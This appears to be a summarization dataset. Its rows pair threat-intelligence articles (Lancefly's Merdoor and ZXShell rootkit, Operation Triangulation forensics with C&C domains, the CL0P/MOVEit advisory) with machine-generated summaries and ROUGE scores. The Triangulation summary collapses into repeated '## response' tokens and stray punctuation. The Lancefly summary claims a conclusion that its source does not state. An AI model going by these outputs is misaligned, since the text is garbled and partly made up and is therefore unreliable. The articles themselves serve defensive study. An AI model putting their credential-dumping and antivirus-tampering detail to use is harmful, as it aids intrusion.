2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vulnerability is specific to log4jcore and does not affect log4net, log4cxx, or other Apache Logging Services projects. Recommended MitigationsApply patches provided by vendor and perform required system updates. The TerraMaster OS Unauthenticated Remote Command Execution via PHP Object Instantiation Vulnerability is characterized by scanning activity targeting a flaw in the script enabling a remote adversary to execute commands on the target endpoint. The vulnerability is created by improper input validation of the webNasIPS component in the api.php script and resides on the TNAS device appliances' operating system where users manage storage, backup data, and configure applications. By exploiting the script flaw a remote unauthenticated attacker can pass specially crafted data to the application and execute arbitrary commands on the target system. This may result in complete compromise of the target system, including the exfiltration of information.";en;{'r': 0.30073529411764705, 'p': 0.966903073286052, 'f': 0.4587773379400199};{'r': 0.24631751227495907, 'p': 0.9190839694656489, 'f': 0.38851242002865327};{'r': 0.30073529411764705, 'p': 0.966903073286052, 'f': 0.4587773379400199}
http://prod-blogs-ui.client-b1.bkjdigital.com/blogs/threat-intelligence/lancefly-merdoor-zxshell-custom-backdoor;Lancefly: Group Uses Custom Backdoor to Target Orgs in Government, Aviation, Other Sectors;"Attack ChainEvidence from Lancefly's earlier campaign that began in 2020 suggested that in that instance the group may have used a phishing email with a lure based on the 37th ASEAN Summit as an initial infection vector.In this more recent activity, the initial infection vector was not entirely clear. We saw some indications of what the initial infection vector may have been in two victims, though this was not conclusive.In one of the government sector victims, there were indications that the initial infection vector may have been SSH brute forcing. Multiple open-source sources associate one of the IP addresses used by the threat actors in this activity with SSH brute forcing, indicating that the initial infection vector was possibly SSH brute forcing.In another victim, a file path (Csidl_program_files\loadbalancer\ibm\edge\lb\servers\bin) indicates a load balancer may have been exploited for access, indicating that the initial infection vector may have been an exposed public-facing server.While evidence for any of these infection vectors is not definitive, it does appear to indicate that Lancefly is adaptable when it comes to the kind of infection vectors it uses.Credential theft using non-malware techniquesIn activity that also aligned with their earlier campaign in 2020/2021, the attackers used a number of non-malware techniques for credential theft on victim machines:PowerShell was used to launch rundll32.exe in order to dump the memory of a process using the MiniDump function of comsvcs.dll. This technique is often used to dump LSASS memory.Reg.exe was used to dump the SAM and SYSTEM registry hives.A legitimate tool by Avast was installed by the attackers and used to dump LSASS memory.The attackers also used a masqueraded version of the legitimate archiving tool WinRAR to stage and encrypt files before exfiltration.Notable attack chain tools and TTPsImpacket Atexec: A dual-use tool that can be used by malicious actors to create and run an immediate scheduled task on a remote target via SMB in order to execute commands on a target system. It is used by Lancefly for lateral movement across victim networks, also possibly for shellcode execution and evasion. It may have been used to delete cmdline output files.A dual-use tool that can be used by malicious actors to create and run an immediate scheduled task on a remote target via SMB in order to execute commands on a target system. It is used by Lancefly for lateral movement across victim networks, also possibly for shellcode execution and evasion. It may have been used to delete cmdline output files. Suspicious SMB activity: Suspicious SMB activity is seen on numerous victim machines. This is likely related to the use of Impacket by the threat actors.Suspicious SMB activity is seen on numerous victim machines. This is likely related to the use of Impacket by the threat actors. WinRAR: An archive manager that can be used to archive or zip files - for example, prior to exfiltration. It is not clear how the attackers exfiltrate the data from victim machines, but it is most likely via Merdoor.An archive manager that can be used to archive or zip files - for example, prior to exfiltration. It is not clear how the attackers exfiltrate the data from victim machines, but it is most likely via Merdoor. LSSAS Dumper: Allows the attackers to swiftly steal credentials they can then use to gain further access across victim networks.Allows the attackers to swiftly steal credentials they can then use to gain further access across victim networks. NBTScan: Open-source command-line NetBIOS scanner. This can be used to gather information on a network.Open-source command-line NetBIOS scanner. This can be used to gather information on a network. Blackloader and Prcloader: Loaders used by the group. These loaders were also both used in earlier Merdoor activity in 2020 and 2021. They have been linked to the delivery of PlugX. Both loaders appear to be sideloaded onto victim machines. It is not clear if these loaders are exclusively used by Lancefly or if their use is shared across multiple groups.A typical Merdoor attack chain, as seen in one of the victims, appears to be:Merdoor injected into either perfhost.exe or svchost.exe.Suspicious SMB activity is then normally observed, and the backdoor connects to its C&C server.This is often followed by suspicious living-off-the-land activity, such as the execution of commands like mavinject.exe (which can be used for process injection) and createdump.exe (which can be used to dump a process e.g. LSASS).A masqueraded WinRAR (wmiprvse.exe) file is then used to stage and encrypt files, presumably prior to exfiltration. We do not actually see the files being exfiltrated from victim networks, but we presume the Merdoor backdoor itself is used to exfiltrate them.ZXShell Rootkit Technical DetailsThe ZXShell rootkit was first reported on by Cisco in 2014, but the version of the tool used by Lancefly is updated, indicating that it continues to be actively developed. The source code of this rootkit is publicly available so it may be used by multiple different groups. The new version of the rootkit used by Lancefly appears to be smaller in size, while it also has additional functions and targets additional antivirus software to disable.LoaderThe loader for the rootkit is a 32-bit DLL with the export directory name ""FormDll.dll"" (SHA256: 1f09d177c99d429ae440393ac9835183d6fd1f1af596089cc01b68021e2e29a7).It has the following exports:""CallDriver""""DoRVA""""KillAvpProcess""""LoadSys""""ProtectDllFile""Export ""Loadsys""Whenever the export ""LoadSys"" is executed, it drops one of the following files based on the processor architecture:""[WindowsDirectory]\system32\drivers\TdiProxy.sys""""[WindowsDirectory]\system64\drivers\TdiProxy.sys""These files are a malicious Windows Kernel driver. This is a variant of a driver that was first documented in an RSA blog several years ago.It has the PDB filename: ""c:\google\objchk_win7_amd64\amd64\Google.pdb""The sample creates the device: ""\Device\TdiProxy0"".It also creates the symbolic link ""\DosDevices\TdiProxy0"", so that it can be controlled using the pathname ""\\.\TdiProxy0"".After this, the loader timestamps the dropped file by copying the timestamps from the file ""[WindowsDirectory]\system32\drivers\http.sys"".Then it creates a service with the following parameters:ServiceName = ""TdiProxy0""DisplayName = ""TdiProxy0"" (later replaced with ""TdiProxy"")BinaryPathName = ""[WindowsDirectory]\system32\drivers\TdiProxy.sys""Export ""CallDriver""""CallDriver"" opens the following device, which was created by the "" \\.\TdiProxy0"" malicious kernel driver.It communicates with it using the DeviceIoControl API.The export expects two arguments. The first argument determines the dwIoControlCode parameter to use when calling the DeviceIoControl API and it should be one of the following strings:""-init"",""-file"",""-pack"",""-port"",""-removetcpview"",""-tcpview"",""-clearall"",""-clear"",""-transport"",""-waitport"",""-kill"",""-antiscan"",""-removeprocessnotify"",""-setprocessnotify"",""-antiantigp"",""-hideproc"",""-hidekey"",""-hidefile"",""-setprotect"",Any other values result in what looks like a buggy dwIoControlCode value. The second argument is a string to pass as an lpInBuffer parameter when calling the DeviceIoControl API, after conversion using the MultiByteToWideChar API.Export ""DoRVA""Whenever the export ""DoRVA"" is executed, it reads the following file:""[file_directory_of_the_DLL]\Form.hlp""The file should start with the magic string ""AP32"" and contains shellcode to execute in compressed form.Export ""KillAvpProcess""This enumerates running processes and for selected processes and calls its own export ""CallDriver"" with the following parameters:first parameter: ""-kill""second parameter: ""[ProcessID]""The export expects a single string parameter to compare with the executable file of running processes for selection.Export ""ProtectDllFile""This calls its own export ""CallDriver"" with the following parameters:first parameter: ""-file""second parameter: ""[file_path_of_the_DLL]""Next, it sets the following registry value:HKEY_LOCAL_MACHINE\SOFTWARE\Classes\.ptdf\""ptdffile"" = ""[file_path_of_the_DLL]""LoadpointThis is a 32-bit executable with the PDB filename: ""M:\Project\database\10.0.18362\Form\Release\Form.pdb"". (SHA256: 180970fce4a226de05df6d22339dd4ae03dfd5e451dcf2d464b663e86c824b8e)Whenever the sample is executed, it loads the following DLL:""[file_path_of_the_running_executable]\FormDll.dll""It also calls its export: ""DoRVA"".Installation and Update UtilityThe installation and update utility is a 32-bit PE executable (SHA256: a6020794bd6749e0765966cd65ca6d5511581f47cc2b38e41cb1e7fddaa0b221) that shares small but distinctive fragments of code with the Merdoor loader, which is what indicates they are part of the same toolset.Whenever the sample is executed, it attempts to read and delete the following file containing its configuration data:""[file_directory_of_running_executable]\res.ini""Update functionalityNext, it checks that:""\\.\TdiProxy0"" device is available, andThat its own process was started with the command-line parameter ""-up"".If both checks pass, the sample attempts to tamper with various antivirus products using the ""\\.\TdiProxy0"" device. For example, it may terminate the processes ""egui.exe"", ""ekrn.exe"", and ""msmpeng.exe"".Next, it attempts to rename the file ""[FILE_DIRECTORY_OF_RUNNING_EXECUTABLE]\res.dat"" as one of the following (depending on the Windows version):""[SystemDrive]\Users\All Users\Windows Defender\temp.temp""""[WindowsDirectory]\temp.temp"".Based on the structure of the code, the above file should start with the magic string ""AP32"" and could contain a DLL file in compressed form. The sample then decompresses the renamed file ""temp.temp"". When decompressing, it may create the temporary file ""temp.temp.pack"" in the same folder.Next, the sample appends a certain marker followed by the content of ""[FILE_DIRECTORY_OF_RUNNING_EXECUTABLE]\res.ini"" (partially transformed using the XOR algorithm with the byte key 0x12) at the end of the decompressed file.Additionally, it also creates the following registry value:HKEY_CLASSES_ROOT\.udf\""BINTYPE"" = [content of ""[file_directory_of_running_executable]\res.ini"" (partially transformed using the XOR algorithm with the byte key 0x12)]Then the sample checks if the following file exists:""[SystemDrive]\Users\All Users\Windows Defender\DefenderSvc.dll""If so, the sample renames the updated ""temp.temp"" file to replace it.Otherwise, it checks the following registry value for the pathname to replace:HKEY_LOCAL_MACHINE\SOFTWARE\Classes\.ecdf\""ecdffile""If that fails, it uses a default from configuration data.Finally, it checks the following registry value for a service name:HKEY_LOCAL_MACHINE\SOFTWARE\Classes\.tudf\""tudffile""It restarts the referred service.Installation functionalityThe sample attempts to decompress the following file:""[FILE_DIRECTORY_OF_RUNNING_EXECUTABLE]\google64.p"" (64-bit processor architecture), or""[FILE_DIRECTORY_OF_RUNNING_EXECUTABLE]\google32.p"" (32-bit processor architecture)as:""[WindowsDirectory]\Microsoft.NET\Framework64\iesockethlp.dll"" (64-bit processor architecture), or""[WindowsDirectory]\Microsoft.NET\Framework\iesockethlp.dll"" (32-bit processor architecture)Then it may modify one of the following registry values to hijack the corresponding service:HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\exfat\""ImagePath"" = ""\??\[PATHNAME_OF_FILE_DECOMPRESSED_ABOVE]"", orHKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RDPWD\""ImagePath"" = ""\??\[PATHNAME_OF_FILE_DECOMPRESSED_ABOVE]""Next, it starts the corresponding service and then removes the registry value. It then attempts to tamper with various antivirus products using the ""\\.\TdiProxy0"" device.It then creates a service with the following parameters:ServiceName: ""[PER CONFIGURATION DATA]""ImagePath: ""%SystemRoot%\System32\svchost.exe -k netsvcs"", or ""%SystemRoot%\System32\svchost.exe -k ntmssvcs""Parameters: ServiceDll: ""C:\WINDOWS\Microsoft.NET\Framework64\[PER CONFIGURATION DATA]"", or ""C:\WINDOWS\Microsoft.NET\Framework\[PER CONFIGURATION DATA]""Then it creates the following registry value:HKEY_LOCAL_MACHINE\SOFTWARE\Classes\.tudf\""tudffile"" = [NAME OF CREATED SERVICE]It then deletes the following registry values:HKEY_LOCAL_MACHINE\SOFTWARE\Classes\.ptdf\""ptdffile""HKEY_LOCAL_MACHINE\SOFTWARE\Classes\.ecdf\""ecdffile""Next, it renames the following file:""[FILE_DIRECTORY_OF_RUNNING_EXECUTABLE]\res.dat""as:""[WindowsDirectory]\Microsoft.NET\Framework64\[PER CONFIGURATION DATA].back"" (64-bit processor architecture), or""[WindowsDirectory]\Microsoft.NET\Framework\[PER CONFIGURATION DATA].back"" (32-bit processor architecture)Based on the structure of the code, the above file should start with the magic string ""AP32"" and could contain a DLL file in compressed form (using aPLib for compression).The sample then decompresses the renamed ""[PER CONFIGURATION DATA].back"" as ""[PER CONFIGURATION DATA]"".Next, the sample appends a certain marker followed by the content of ""[FILE_DIRECTORY_OF_RUNNING_EXECUTABLE]\res.ini"" (partially transformed using the XOR algorithm with the byte key 0x12) at the end of the decompressed file.Additionally, it also creates the following registry value:HKEY_CLASSES_ROOT\.udf\""BINTYPE"" = [content of ""[FILE_DIRECTORY_OF_RUNNING_EXECUTABLE]\res.ini"" (partially transformed using the XOR algorithm with the byte key 0x12)]Finally, when the configuration data includes the option ""OneSelfKey"", it makes a compressed copy of its own executable as (using aPLib for compression):""[WindowsDirectory]\SysWOW64ethlp.hlp"" (64-bit processor architecture), or""[WindowsDirectory]\system32ethlp.hlp"" (32-bit processor architecture).Some samples include an embedded archive with the final payload:""Msrpcsvc.dll""This is a variant of the ZXShell backdoor (SHA256: d5df686bb202279ab56295252650b2c7c24f350d1a87a8a699f6034a8c0dd849).Possible Links to Other GroupsThe ZXShell rootkit used by Lancefly is signed by the certificate ""Wemade Entertainment Co. Ltd"", which was previously reported to be associated with APT41 (aka Blackfly/Grayfly). However, it is known that Chinese APT groups, such as APT41, often share certificates with other APT groups. The ZXShell backdoor has also previously been used by the HiddenLynx/APT17 group, but as the source code of ZXShell is now publicly available this does not provide a definitive link between these two groups.Also notable is that the ZXShell rootkit loader component has the name ""formdll.dll"" and it has the ability to read the file ""Form.hlp"" and execute its contents as shellcode. Those same files were mentioned as being used in a previous report detailing activity by the Iron Tiger (aka Budworm/APT27) group. In that case, the attackers used these filenames when loading the PlugX backdoor onto victim machines. The prevalence of such files is very low, which may indicate a potential link between that campaign and this more recent activity.PlugX is also seen being used by Lancefly. PlugX is a remote access Trojan (RAT) with multiple functionalities including backdoor access and data exfiltration. PlugX has existed for well over a decade. It was originally used by Chinese APT groups, but its use is now very widespread, meaning it is difficult to use it as a way of attributing activity.ShadowPad is also used by these attackers. ShadowPad is a modular RAT believed to be exclusively used by Chinese APT groups. Its capabilities are similar to PlugX, and it is often referred to as a successor to that malware.While these overlaps and shared tools may indicate some links between Lancefly activity and activity by other APT groups, none of the overlaps are strong enough to attribute this activity and the development of the Merdoor backdoor to an already-known attack group.Noteworthy Backdoor, Targeted ActivityThis recent Lancefly activity is of note due to its use of the Merdoor backdoor, but also the low prevalence of this backdoor and the seemingly highly targeted nature of these attacks. While the Merdoor backdoor appears to have been in existence for several years, it appears to only have been used in a small number of attacks in that time period. This prudent use of the tool may indicate a desire by Lancefly to keep its activity under the radar.The tools used and sectors targeted all point to the motivations of this attack campaign being intelligence gathering. The similarities between this recent activity and earlier activity by Lancefly indicate that the group perhaps did not realize the earlier activity had been discovered, so it was not concerned about links being made between the two. Whether or not the exposure of this activity will lead to any alteration in how the group carries out its activity remains to be seen.ProtectionFor the latest protection updates, please visit the Symantec Protection Bulletin.Indicators of Compromise (IOCs)Merdoor BackdoorSHA256 Filename Description13df2d19f6d2719beeff3b882df1d3c9131a292cf097b27a0ffca5f45e139581 - a.exe - Merdoor Dropper8f64c25ba85f8b77cfba3701bebde119f610afef6d9a5965a3ed51a4a4b9dead - chrome_frame_helper.exe - Merdoor Dropper8e98eed2ec14621feda75e07379650c05ce509113ea8d949b7367ce00fc7cd38 - siteadv.exe - Merdoor Dropper89e503c2db245a3db713661d491807aab3d7621c6aff00766bc6add892411ddc - siteadv.exe - Merdoor Dropperc840e3cae2d280ff0b36eec2bf86ad35051906e484904136f0e478aa423d7744 -siteadv.exe -Merdoor Dropper5f16633dbf4e6ccf0b1d844b8ddfd56258dd6a2d1e4fb4641e2aa508d12a5075 -chrome_frame_helper.dll - Merdoor Loaderff4c2a91a97859de316b434c8d0cd5a31acb82be8c62b2df6e78c47f85e57740 -chrome_frame_helper.dll - Merdoor Loader14edb3de511a6dc896181d3a1bc87d1b5c443e6aea9eeae70dbca042a426fcf3 -chrome_frame_helper.dll - Merdoor Loaderdb5deded638829654fc1595327400ed2379c4a43e171870cfc0b5f015fad3a03 -chrome_frame_helper.dll - Merdoor Loadere244d1ef975fcebb529f0590acf4e7a0a91e7958722a9f2f5c5c05a23dda1d2c -chrome_frame_helper.dll - Merdoor Loaderf76e001a7ccf30af0706c9639ad3522fd8344ffbdf324307d8e82c5d52d350f2 -chrome_frame_helper.dll - Merdoor Loaderdc182a0f39c5bb1c3a7ae259f06f338bb3d51a03e5b42903854cdc51d06fced6 - smadhook64c.dll - Merdoor Loaderfa5f32457d0ac4ec0a7e69464b57144c257a55e6367ff9410cf7d77ac5b20949 - SiteAdv.dll, chrome_frame_helper.dll -Merdoor Loaderfe7a6954e18feddeeb6fcdaaa8ac9248c8185703c2505d7f249b03d8d8897104 - siteadv.dll - Merdoor Loader341d8274cc1c53191458c8bbc746f428856295f86a61ab96c56cd97ee8736200 - siteadv.dll - Merdoor Loaderf3478ccd0e417f0dc3ba1d7d448be8725193a1e69f884a36a8c97006bf0aa0f4 - siteadv.dll - Merdoor Loader750b541a5f43b0332ac32ec04329156157bf920f6a992113a140baab15fa4bd3 - mojo_core.dll - Merdoor Loader9f00cee1360a2035133e5b4568e890642eb556edd7c2e2f5600cf6e0bdcd5774 - libmupdf.dll - Merdoor Loadera9051dc5e6c06a8904bd8c82cdd6e6bd300994544af2eed72fe82df5f3336fc0 - chrome_frame_helper.dll - Merdoor Loaderd62596889938442c34f9132c9587d1f35329925e011465c48c94aa4657c056c7 - smadhook64c.dll - Merdoor Loaderf0003e08c34f4f419c3304a2f87f10c514c2ade2c90a830b12fdf31d81b0af57 - SiteAdv.pak - Merdoor encoded payload139c39e0dc8f8f4eb9b25b20669b4f30ffcbe2197e3a9f69d0043107d06a2cb4 - SiteAdv.pak - Merdoor encoded payload11bb47cb7e51f5b7c42ce26cbff25c2728fa1163420f308a8b2045103978caf5 - SiteAdv.pak - Merdoor encoded payload0abc1d12ef612490e37eedb1dd1833450b383349f13ddd3380b45f7aaabc8a75 - SiteAdv.pak - Merdoor encoded payloadeb3b4e82ddfdb118d700a853587c9589c93879f62f576e104a62bdaa5a338d7b -SiteAdv.exe - Legit McAfee executable1ab4f52ff4e4f3aa992a77d0d36d52e796999d6fc1a109b9ae092a5d7492b7dd - chrome_frame_helper.exe - Legit Google executablefae713e25b667f1c42ebbea239f7b1e13ba5dc99b225251a82e65608b3710be7 - SmadavProtect64.exe - Legit SmadAV executable";Lancefly is believed to have used a variety of techniques to gain access to victim networks, including the use of backdoors, process injection, and livingofftheland techniques. The group is also believed to have used a variety of tools, including WinRAR, LSSAS Dumper, NBTScan, Blackloader, Prcloader, Merdoor, perfhost.exe, svchost.exe, mavinject.exe, and createdump.exe. The report concludes that Lancefly is a sophisticated and wellresourced cyberespionage group, and that its activities should be taken seriously.;en;{'r': 0.039663461538461536, 'p': 0.6346153846153846, 'f': 0.07466063237689646};{'r': 0.00884433962264151, 'p': 0.22388059701492538, 'f': 0.017016448503076924};{'r': 0.037259615384615384, 'p': 0.5961538461538461, 'f': 0.07013574549906841}
https://securelist.com/operation-triangulation/109842/;Operation Triangulation: iOS devices targeted with previously unknown malware;"While monitoring the network traffic of our own corporate Wi-Fi network dedicated for mobile devices using the Kaspersky Unified Monitoring and Analysis Platform (KUMA), we noticed suspicious activity that originated from several iOS-based phones. Since it is impossible to inspect modern iOS devices from the inside, we created offline backups of the devices in question, inspected them using the Mobile Verification Toolkit's mvt-ios and discovered traces of compromise.We are calling this campaign ""Operation Triangulation"", and all the related information we have on it will be collected on the Operation Triangulation page. If you have any additional details to share, please contact us: triangulation[at]kaspersky.com.What we know so farMobile device backups contain a partial copy of the filesystem, including some of the user data and service databases. The timestamps of the files, folders and the database records allow to roughly reconstruct the events happening to the device. The mvt-ios utility produces a sorted timeline of events into a file called ""timeline.csv"", similar to a super-timeline used by conventional digital forensic tools.Using this timeline, we were able to identify specific artifacts that indicate the compromise. This allowed to move the research forward, and to reconstruct the general infection sequence:The target iOS device receives a message via the iMessage service, with an attachment containing an exploit.Without any user interaction, the message triggers a vulnerability that leads to code execution.The code within the exploit downloads several subsequent stages from the C&C server, that include additional exploits for privilege escalation.After successful exploitation, a final payload is downloaded from the C&C server, that is a fully-featured APT platform.The initial message and the exploit in the attachment is deletedThe malicious toolset does not support persistence, most likely due to the limitations of the OS. The timelines of multiple devices indicate that they may be reinfected after rebooting. The oldest traces of infection that we discovered happened in 2019. As of the time of writing in June 2023, the attack is ongoing, and the most recent version of the devices successfully targeted is iOS 15.7.The analysis of the final payload is not finished yet. The code is run with root privileges, implements a set of commands for collecting system and user information, and can run arbitrary code downloaded as plugin modules from the C&C server.Forensic methodologyIt is important to note, that, although the malware includes portions of code dedicated specifically to clear the traces of compromise, it is possible to reliably identify if the device was compromised. Furthermore, if a new device was set up by migrating user data from an older device, the iTunes backup of that device will contain the traces of compromise that happened to both devices, with correct timestamps.PreparationAll potential target devices must be backed up, either using iTunes, or an open-source utility idevicebackup2 (from the package libimobiledevice). The latter is shipped as a pre-built package with the most popular Linux distributions, or can be built from the source code for MacOS/Linux.To create a backup with idevicebackup2, run the following command:idevicebackup2 backup --full $backup_directoryYou may need to enter the security code of the device several times, and the process may take several hours, depending on the amount of user data stored in it.Install MVTOnce the backup is ready, it has to be processed by the Mobile Verification Toolkit. If Python 3 is installed in the system, run the following command:pip install mvtA more comprehensive installation manual is available the MVT homepage.Optional: decrypt the backupIf the owner of the device has set up encryption for the backup previously, the backup copy will be encrypted. In that case, the backup copy has to be decrypted before running the checks:mvt-ios decrypt-backup -d $decrypted_backup_directory $backup_directoryParse the backup using MVTmvt-ios check-backup -o $mvt_output_directory $decrypted_backup_directoryThis command will run all the checks by MVT, and the output directory will contain several JSON and CSV files. For the methodology described in this blogpost, you will need the file called timeline.csv.Check timeline.csv for indicatorsThe single most reliable indicator that we discovered is the presence of data usage lines mentioning the process named ""BackupAgent"". This is a deprecated binary that should not appear in the timeline during regular usage of the device. However, it is important to note that there is also a binary named ""BackupAgent2"", and that is not an indicator of compromise. In many cases, BackupAgent is preceded by the process ""IMTransferAgent"", that downloads the attachment that happens to be an exploit, and this leads to modification of the timestamps of multiple directories in the ""Library/SMS/Attachments"". The attachment is then deleted, leaving only modified directories, without actual files inside them:2022-09-13 10:04:11.890351Z Datausage IMTransferAgent/com.apple.datausage.messages (Bundle ID: com.apple.datausage.messages, ID: 127) WIFI IN: 0.0, WIFI OUT: 0.0 - WWAN IN: 76281896.0, WWAN OUT: 100956502.02022-09-13 10:04:54.000000Z Manifest Library/SMS/Attachments/65/05 - MediaDomain2022-09-13 10:05:14.744570Z Datausage BackupAgent (Bundle ID: , ID: 710) WIFI IN: 0.0, WIFI OUT: 0.0 - WWAN IN: 734459.0, WWAN OUT: 287912.0 There are also less reliable indicators, that may be treated as IOCs if several of them happened within a timeframe of minutes: Modification of one or several files: com.apple.ImageIO.plist, com.apple.locationd.StatusBarIconManager.plist, com.apple.imservice.ids.FaceTime.plistData usage information of the services com.apple.WebKit.WebContent, powerd/com.apple.datausage.diagnostics, lockdownd/com.apple.datausage.security Example:2021-10-30 16:35:24.923368Z Datausage IMTransferAgent/com.apple.MobileSMS (Bundle ID: com.apple.MobileSMS, ID: 945) WIFI IN: 0.0, WIFI OUT: 0.0 - WWAN IN: 31933.0, WWAN OUT: 104150.02021-10-30 16:35:24.928030Z Datausage IMTransferAgent/com.apple.MobileSMS (Bundle ID: com.apple.MobileSMS, ID: 945)2021-10-30 16:35:24.935920Z Datausage IMTransferAgent/com.apple.datausage.messages (Bundle ID: com.apple.datausage.messages, ID: 946) WIFI IN: 0.0, WIFI OUT: 0.0 - WWAN IN: 47743.0, WWAN OUT: 6502.02021-10-30 16:35:24.937976Z Datausage IMTransferAgent/com.apple.datausage.messages (Bundle ID: com.apple.datausage.messages, ID: 946)2021-10-30 16:36:51.000000Z Manifest Library/Preferences/com.apple.locationd.StatusBarIconManager.plist - HomeDomain2021-10-30 16:36:51.000000Z Manifest Library/Preferences/com.apple.ImageIO.plist - RootDomain Another example: modification of an SMS attachment directory (but no attachment filename), followed by data usage of com.apple.WebKit.WebContent, followed by modification of com.apple.locationd.StatusBarIconManager.plist. All the events happened within a 1-3 minute timeframe, indicating the result of a successful zero-click compromise via an iMessage attachment, followed by the traces of exploitation and malicious activity.2022-09-11 19:52:56.000000Z Manifest Library/SMS/Attachments/98 - MediaDomain2022-09-11 19:52:56.000000Z Manifest Library/SMS/Attachments/98/08 - MediaDomain2022-09-11 19:53:10.000000Z Manifest Library/SMS/Attachments/98/08 - MediaDomain2022-09-11 19:54:51.698609Z OSAnalyticsADDaily com.apple.WebKit.WebContent WIFI IN: 77234150.0, WIFI OUT: 747603971.0 - WWAN IN: 55385088.0, WWAN OUT: 425312575.02022-09-11 19:54:51.702269Z Datausage com.apple.WebKit.WebContent (Bundle ID: , ID: 1125)2022-09-11 19:54:53.000000Z Manifest Library/Preferences/com.apple.locationd.StatusBarIconManager.plist - HomeDomain2022-06-26 18:21:36.000000Z Manifest Library/SMS/Attachments/ad/13 - MediaDomain2022-06-26 18:21:36.000000Z Manifest Library/SMS/Attachments/ad - MediaDomain2022-06-26 18:21:50.000000Z Manifest Library/SMS/Attachments/ad/13 - MediaDomain2022-06-26 18:22:03.412817Z OSAnalyticsADDaily com.apple.WebKit.WebContent WIFI IN: 19488889.0, WIFI OUT: 406382282.0 - WWAN IN: 66954930.0, WWAN OUT: 1521212526.02022-06-26 18:22:16.000000Z Manifest Library/Preferences/com.apple.ImageIO.plist - RootDomain2022-06-26 18:22:16.000000Z Manifest Library/Preferences/com.apple.locationd.StatusBarIconManager.plist - HomeDomain2022-03-21 21:37:55.000000Z Manifest Library/SMS/Attachments/fc - MediaDomain2022-03-21 21:37:55.000000Z Manifest Library/SMS/Attachments/fc/12 - MediaDomain2022-03-21 21:38:08.000000Z Manifest Library/SMS/Attachments/fc/12 - MediaDomain2022-03-21 21:38:23.901243Z OSAnalyticsADDaily com.apple.WebKit.WebContent WIFI IN: 551604.0, WIFI OUT: 6054253.0 - WWAN IN: 0.0, WWAN OUT: 0.02022-03-21 21:38:24.000000Z Manifest Library/Preferences/com.apple.locationd.StatusBarIconManager.plist - HomeDomain An even less implicit indicator of compromise is inability to install iOS updates. We discovered malicious code that modifies one of the system settings file named com.apple.softwareupdateservicesd.plist. We observed update attempts to end with an error message ""Software Update Failed. An error ocurred downloading iOS"".Network activity during exploitationOn the network level, a successful exploitation attempt can be identified by a sequence of several HTTPS connection events. These can be discovered in netflow data enriched with DNS/TLS host information, or PCAP dumps:Legitimate network interaction with the iMessage service, usually using the domain names *.ess.apple.comDownload of the iMessage attachment, using the domain names .icloud-content.com, content.icloud.comMultiple connections to the C&C domains, usually 2 different domains (the list of known domains follows). Typical netflow data for the C&C sessions will show network sessions with significant amount of outgoing traffic.The iMessage attachment is encrypted and downloaded over HTTPS, the only implicit indicator that can be used is the amount of downloaded data that is about 242 Kb.C&C domainsUsing the forensic artifacts, it was possible to identify the set of domain name used by the exploits and further malicious stages. They can be used to check the DNS logs for historical information, and to identify the devices currently running the malware:addatamarket[.]netbackuprabbit[.]combusinessvideonews[.]comcloudsponcer[.]comdatamarketplace[.]netmobilegamerstats[.]comsnoweeanalytics[.]comtagclick-cdn[.]comtopographyupdates[.]comunlimitedteacup[.]comvirtuallaughing[.]comweb-trackers[.]comgrowthtransport[.]comanstv[.]netans7tv[.]net";The Kaspersky Unified Monitoring and Analysis Platform (KUMA) was used to monitor the network traffic of our own corporate WiFi network dedicated for mobile devices. During the monitoring, suspicious activity was detected originating from several iOSbased phones. Since it is impossible to inspect modern iOS devices from the inside, offline backups of the devices were created and inspected using the Mobile Verification Toolkit's mvtios. This allowed to reconstruct the general infection sequence. The initial message and the exploit in the attachment was deleted. The timelines of multiple devices indicate that they may be reinfected after rebooting. The oldest traces of infection that we discovered happened in 2019. As of the time of writing in June 2023, the attack is ongoing, and the most recent version of the devices successfully targeted is iOS 15.7. The analysis of the final payload is not finished yet. The code is run with root privileges, implements a set of commands for collecting system and user information, and can run arbitrary code downloaded as plugin modules from the C&C server. The device was compromised. ## response ## response ## response ## response ## response ## response ## ## response ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . : : . . . . : [ [ [[ [ [. [. . . . . .;en;{'r': 0.17936507936507937, 'p': 0.875968992248062, 'f': 0.29776020798221087};{'r': 0.12203687445127305, 'p': 0.7473118279569892, 'f': 0.20981131834128586};{'r': 0.16825396825396827, 'p': 0.8217054263565892, 'f': 0.27931488518906206}
https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-158a;#StopRansomware: CL0P Ransomware Gang Exploits CVE-2023-34362 MOVEit Vulnerability;"SUMMARYNote: this joint Cybersecurity Advisory (CSA) is part of an ongoing StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.Actions to take today to mitigate cyber threats from CL0P ransomware:Take an inventory of assets and data, identifying authorized and unauthorized devices and software.Grant admin privileges and access only when necessary, establishing a software allow list that only executes legitimate applications.Monitor network ports, protocols, and services, activating security configurations on network infrastructure devices such as firewalls and routers.Regularly patch and update software and applications to their latest versions, and conduct regular vulnerability assessments.The Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint CSA to disseminate known CL0P ransomware IOCs and TTPs identified through FBI investigations as recently as June 2023.According to open source information, beginning on May 27, 2023, CL0P Ransomware Gang, also known as TA505, began exploiting a previously unknown SQL injection vulnerability (CVE-2023-34362) in Progress Software's managed file transfer (MFT) solution known as MOVEit Transfer. Internet-facing MOVEit Transfer web applications were infected with a web shell named LEMURLOOT, which was then used to steal data from underlying MOVEit Transfer databases. In similar spates of activity, TA505 conducted zero-day-exploit-driven campaigns against Accellion File Transfer Appliance (FTA) devices in 2020 and 2021, and Fortra/Linoma GoAnywhere MFT servers in early 2023.FBI and CISA encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood 